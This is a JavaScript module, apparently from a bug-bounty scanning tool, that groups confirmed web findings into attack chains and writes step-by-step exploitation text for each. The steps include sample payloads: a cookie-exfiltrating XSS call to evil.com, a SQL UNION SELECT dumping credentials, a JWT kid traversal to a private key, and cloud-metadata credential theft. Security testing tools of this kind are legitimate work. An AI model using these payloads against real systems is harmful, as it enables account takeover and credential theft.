import { getFindings, addFinding } from './findings.js';
import { fetchText } from '../utils/fetch.js';

export async function buildAttackChains(origin, spinner) {
  const findings = getFindings();
  const confirmed = findings.filter(f => f.validated && f.exploitability === 'confirmed');
  const inconclusive = findings.filter(f => f.validated && f.exploitability === 'inconclusive');

  const allRelevant = [...confirmed, ...inconclusive];
  const chains = [];

  spinner.text = '[Chains] Building attack chains...';

  const hasXss = allRelevant.filter(f => f.title.toLowerCase().includes('xss') && f.module.includes('Browser'));
  const hasSqli = allRelevant.filter(f => f.title.toLowerCase().includes('sql'));
  const hasOpenRedirect = allRelevant.filter(f => f.title.toLowerCase().includes('open redirect') || f.title.toLowerCase().includes('redirect'));
  const hasSsrf = allRelevant.filter(f => f.title.toLowerCase().includes('ssrf'));
  const hasJwt = allRelevant.filter(f => f.title.toLowerCase().includes('jwt'));
  const hasCors = allRelevant.filter(f => f.title.toLowerCase().includes('cors'));
  const hasCsrf = allRelevant.filter(f => f.title.toLowerCase().includes('csrf') || f.title.toLowerCase().includes('state-mut'));
  const hasIdor = allRelevant.filter(f => f.title.toLowerCase().includes('idor') || f.title.toLowerCase().includes('access control'));
  const hasNosql = allRelevant.filter(f => f.title.toLowerCase().includes('nosql'));
  const hasLfi = allRelevant.filter(f => f.title.toLowerCase().includes('lfi') || f.title.toLowerCase().includes('path traversal'));
  const hasOauth = allRelevant.filter(f => f.title.toLowerCase().includes('oauth'));
  const hasSubdomain = allRelevant.filter(f => f.title.toLowerCase().includes('subdomain') || f.title.toLowerCase().includes('takeover'));
  const hasAuthBypass = allRelevant.filter(f => f.title.toLowerCase().includes('auth bypass') || f.title.toLowerCase().includes('authentication'));
  const hasCookie = allRelevant.filter(f => f.title.toLowerCase().includes('cookie'));
  const hasExposed = allRelevant.filter(f => f.module === 'Exposed Files');

  if (hasOpenRedirect.length > 0 && hasOauth.length > 0) {
    chains.push({
      name: 'Open Redirect → OAuth Token Theft → ATO',
      primitives: [hasOpenRedirect[0].title, hasOauth[0].title],
      steps: [
        `1. Open redirect via ${extractParam(hasOpenRedirect[0].title)} parameter`,
        '2. Craft OAuth authorization URL with redirect_uri pointing to open redirect',
        '3. Victim clicks link → redirected to attacker domain with OAuth code/token',
        '4. Attacker exchanges code for access token → full account takeover',
      ],
      impact: 'CRITICAL',
      confidence: hasOpenRedirect.some(f => f.confidence >= 80) && hasOauth.some(f => f.confidence >= 70) ? 85 : 55,
    });
  }

  if (hasXss.length > 0 && hasCookie.length > 0) {
    chains.push({
      name: 'XSS → Cookie Theft → Session Hijacking → ATO',
      primitives: [hasXss[0].title, hasCookie[0].title],
      steps: [
        '1. Inject XSS payload to steal cookies: fetch("//evil.com/?c="+document.cookie)',
        `2. Cookie missing HttpOnly flag — accessible via JavaScript`,
        '3. Attacker receives victim session cookie via XSS callback',
        '4. Set stolen cookie in browser → authenticated as victim → full ATO',
      ],
      impact: 'CRITICAL',
      confidence: hasXss.some(f => f.confidence >= 80) && hasCookie.some(f => f.confidence >= 60) ? 90 : 60,
    });
  }

  if (hasSsrf.length > 0 && hasExposed.length > 0) {
    chains.push({
      name: 'SSRF → Cloud Metadata → Credential Leak',
      primitives: [hasSsrf[0].title, hasExposed[0]?.title || 'Exposed internal endpoint'],
      steps: [
        '1. Exploit SSRF to access internal cloud metadata (169.254.169.254)',
        '2. Extract IAM credentials from metadata response',
        '3. Use leaked credentials for AWS CLI access',
        '4. Enumerate S3 buckets, Lambda functions, RDS databases',
      ],
      impact: 'CRITICAL',
      confidence: hasSsrf.some(f => f.confidence >= 80) ? 80 : 50,
    });
  }

  if (hasJwt.length > 0 && hasLfi.length > 0) {
    chains.push({
      name: 'JWT kid Injection → Path Traversal → Key Read → Token Forge',
      primitives: [hasJwt[0].title, hasLfi[0].title],
      steps: [
        '1. JWT uses kid (Key ID) from user input — inject path traversal',
        "2. Set kid to '../../../../etc/ssl/private/server.key'",
        '3. Server reads private key and signs attacker-forged JWT',
        '4. Forge admin JWT → full privileged access',
      ],
      impact: 'CRITICAL',
      confidence: hasJwt.some(f => f.confidence >= 70) ? 75 : 45,
    });
  }

  if (hasSqli.length > 0 && hasAuthBypass.length > 0) {
    chains.push({
      name: 'SQL Injection → Data Dump → Password Hashes → Credential Stuffing',
      primitives: [hasSqli[0].title, hasAuthBypass[0].title],
      steps: [
        '1. Exploit SQLi to extract user table: UNION SELECT email,password FROM users',
        '2. Crack extracted password hashes (hashcat/john)',
        '3. Use credentials for credential stuffing on other services',
        '4. If MFA bypass found, directly access accounts with cracked passwords',
      ],
      impact: 'CRITICAL',
      confidence: hasSqli.some(f => f.confidence >= 80) ? 85 : 55,
    });
  }

  if (hasNosql.length > 0 && hasIdor.length > 0) {
    chains.push({
      name: 'NoSQL Injection → Auth Bypass → IDOR → Mass Data Extraction',
      primitives: [hasNosql[0].title, hasIdor[0].title],
      steps: [
        '1. Bypass auth via NoSQL injection ($ne operator)',
        '2. Gain authenticated session without valid credentials',
        '3. Exploit IDOR by iterating object IDs (user/1, user/2, user/3...)',
        '4. Extract all user data, PII, financial info',
      ],
      impact: 'CRITICAL',
      confidence: hasNosql.some(f => f.confidence >= 80) ? 85 : 55,
    });
  }

  if (hasCors.length > 0 && hasCsrf.length > 0) {
    chains.push({
      name: 'CORS Misconfig → CSRF → Privilege Escalation',
      primitives: [hasCors[0].title, hasCsrf[0].title],
      steps: [
        '1. CORS reflects arbitrary origin with credentials',
        '2. Host malicious page on attacker domain',
        '3. CSRF attack from attacker domain: POST /api/admin/create-user',
        '4. Victim browser sends authenticated cross-origin request with cookies',
      ],
      impact: 'HIGH',
      confidence: hasCors.some(f => f.confidence >= 80) && hasCsrf.some(f => f.confidence >= 60) ? 80 : 55,
    });
  }

  if (hasSubdomain.length > 0 && hasCookie.length > 0) {
    chains.push({
      name: 'Subdomain Takeover → Cookie Scope Abuse → Session Fixation',
      primitives: [hasSubdomain[0].title, hasCookie[0].title],
      steps: [
        '1. Take over dangling subdomain (CNAME pointing to unregistered cloud resource)',
        '2. Deploy malicious page on the taken-over subdomain',
        '3. Set cookies scoped to parent domain via Set-Cookie header',
        "4. Fixate victim's session → intercept authenticated requests",
      ],
      impact: 'HIGH',
      confidence: 65,
    });
  }

  if (hasAuthBypass.length > 0 && hasIdor.length > 0) {
    chains.push({
      name: 'Auth Bypass → IDOR → Privilege Escalation',
      primitives: [hasAuthBypass[0].title, hasIdor[0].title],
      steps: [
        '1. Bypass authentication via found auth vulnerability',
        '2. Access restricted endpoints',
        '3. Exploit IDOR to access other users/tenants data',
        '4. Read/modify admin-level resources → full compromise',
      ],
      impact: 'CRITICAL',
      confidence: hasAuthBypass.some(f => f.confidence >= 70) ? 80 : 55,
    });
  }

  if (openRedirectXssTester(allRelevant)) {
    chains.push({
      name: 'Open Redirect → XSS (via javascript: URI) → Credential Phishing',
      primitives: ['Open Redirect', 'DOM/Browser interaction surface'],
      steps: [
        '1. Open redirect allows javascript: URIs',
        '2. Craft: javascript:alert(document.cookie) as redirect target',
        '3. Victim clicks link → XSS executes in application context',
        '4. Steal credentials, CSRF tokens, or inject fake login form',
      ],
      impact: 'HIGH',
      confidence: 60,
    });
  }

  if (chains.length > 0) {
    reportChains(chains);
  }
}

async function reportChains(chains) {
  for (const chain of chains) {
    addFinding(
      chain.impact,
      'Attack Chain',
      chain.name,
      `Primitives: ${chain.primitives.join(' + ')}\n\nChain:\n${chain.steps.join('\n')}\n\nConfidence: ${chain.confidence}%`,
      `Execute chain steps manually to confirm full impact. Submit as chained vulnerability for higher bounty payout.`
    );
  }
}

function extractParam(title) {
  const m = title.match(/via\s+\?(\w+)=/);
  return m ? m[1] : 'unknown';
}

function openRedirectXssTester(findings) {
  const redirectTitles = findings.filter(f => f.title.toLowerCase().includes('open redirect')).map(f => f.title);
  const xssTitles = findings.filter(f => f.title.toLowerCase().includes('xss')).map(f => f.title);
  return redirectTitles.length > 0 && xssTitles.length > 0;
}
